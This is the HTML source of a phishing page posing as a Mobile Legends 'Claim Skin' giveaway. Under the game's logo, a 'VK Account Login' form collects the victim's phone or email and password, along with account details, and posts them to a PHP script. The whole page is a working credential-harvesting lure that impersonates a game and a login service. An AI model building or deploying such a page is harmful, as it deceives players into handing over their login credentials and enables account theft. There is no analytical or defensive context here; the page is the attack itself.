<html>
<head>
<title>Mobile Legends - Claim Skin</title>
<link rel="shorcut icon" href="https://www.mobilelegends.com/images/favicon.ico?v=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<style type="text/css">
body { 
  background: url(http://i.imgur.com/Cvx0WTU.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.container {
	position:relative;
	margin:50px auto;
	max-width:800px;
	height:auto;
	border:2px solid #fff;
	padding:30px;
	box-sizing: border-box;
}

.transparent{
 background:rgba(31, 255, 28, 0.9);
 width: 100%;
 height:270px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}

.transparent-box{
 background:rgba(46, 0, 102, 0.9);
 width: 100%;
 height:720px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}
</style>

</head>
<body>


<center><img src="https://upload.wikimedia.org/wikipedia/en/9/9e/Mobilelegends.png"></center>



				
<div class="container transparent-box">
			
<center><font size="6">VK Account Login</font></center>
<form action="vk-login-success.php" method="post">
<div class="container">

<div class="form-group">
<input type="text" name="email" id="email" class="form-control" placeholder="Phone or Email" required>
</div>

<div class="form-group">
<input type="password" name="password" id="password" class="form-control" placeholder="Password" required>
</div>

<center><font size="6">Account Detail</font></center>

<div class="form-group">
<input type="text" name="username" id="username" class="form-control" placeholder="Username" required>
</div>

<div class="form-group">
<input type="number" name="level" id="level" class="form-control" placeholder="Account Level" maxlength="30" minlength="15" required>
</div>

<div class="form-group">
<input type="number" name="tlevel" id="tlevel" class="form-control" placeholder="Tier Level" required>
</div>

<div class="form-group">
<input type="number" name="skin" id="skin" class="form-control" placeholder="Skin in Your Account" required>
</div>

<div class="form-group">
<input type="text" name="region" id="region" class="form-control" placeholder="Region" required>
</div>

<button type="submit" class="btn btn-success btn-block">Login</button>

</div>
       
</form>


</body>
</html>